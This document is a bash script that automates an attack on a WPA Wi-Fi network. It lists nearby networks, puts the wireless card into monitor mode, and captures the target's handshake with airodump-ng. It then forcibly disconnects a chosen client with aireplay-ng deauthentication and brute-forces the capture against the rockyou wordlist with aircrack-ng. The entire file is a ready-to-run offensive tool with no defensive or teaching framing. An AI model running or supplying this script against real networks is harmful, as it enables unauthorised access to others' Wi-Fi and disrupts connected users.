#!/bin/bash

if [[ $EUID -ne 0 ]]; then
	echo "This script must be run as root" 
	exit 1
fi

wordlist="/usr/share/wordlists/rockyou.txt"
interface=$(iw dev | awk '$1=="Interface"{print $2}')

while getopts w: option
do
case "${option}"
in
w) wordlist=${OPTARG};;
esac
done

if [[ $interface = *"mon"* ]]; then
        echo "[*] Monitoring interface detected. Stopping wlan0mon..."
        airmon-ng stop $interface > /dev/null 2>&1
        echo "[*] Restarting network manager service..."
        service network-manager restart > /dev/null 2>&1
        echo " "
fi

interface=$(iw dev | awk '$1=="Interface"{print $2}')
monint="${interface}mon"

nmcli -f SSID,BSSID,ACTIVE,RATE,BARS,SECURITY dev wifi list
echo " "
echo -n "Enter a SSID or BSSID: "
read input
isbssid=0

while true;
do
if [[ $input =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]; then
     isbssid=1
     bssid=$input
else
     bssid=$(nmcli -f SSID,BSSID,ACTIVE,RATE,BARS,SECURITY dev wifi list | grep -i $input | xargs | cut -d " " -f 2)
fi

if [ -z "$bssid" ]; then
	echo -n "Network not found. Re-enter SSID/BSSID: "
	read retry
	input=$retry
else
	break
fi
done

ch=$(nmcli -f SSID,BSSID,CHAN dev wifi list | grep $bssid | xargs | cut -d " " -f 3)

echo "[*] Killing processes that might cause conflict issues..."
airmon-ng check kill > /dev/null 2>&1
echo "[*] Putting $interface in monitor mode..."
airmon-ng start $interface > /dev/null 2>&1
echo "[*] Capturing beacons in a new terminal tab..."
echo "$bssid $ch $monint" > .args.txt
if [ ! -d "output" ]; then
	mkdir output/
else
	rm -f output/*
fi
gnome-terminal --tab -e 'sh -c "airodump-ng --bssid \$(cat .args.txt | cut -d \" \" -f 1) --channel \$(cat .args.txt | cut -d \" \" -f 2) --write output/output \$(cat .args.txt | cut -d \" \" -f 3); exec bash"' &> /dev/null
echo -n "[!] Enter a client BSSID you wish to deauthenticate: "
read client
while true;
do
if [[ $client =~ ^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$ ]]; then
	break
else
	echo -n "[!] Invalid client BSSID. Re-enter: "
	read cretry
	client=$cretry
fi
done

echo "[*] Deauthenticating $client..."
aireplay-ng -0 1 -a $bssid -c $client $monint > /dev/null 2>&1
read -p "[*] Press ENTER when ready to brute force. The more beacons, the better signal quality..."
echo "[*] Starting attack..."
rm .args.txt
aircrack-ng -w $wordlist -b $bssid output/output*.cap
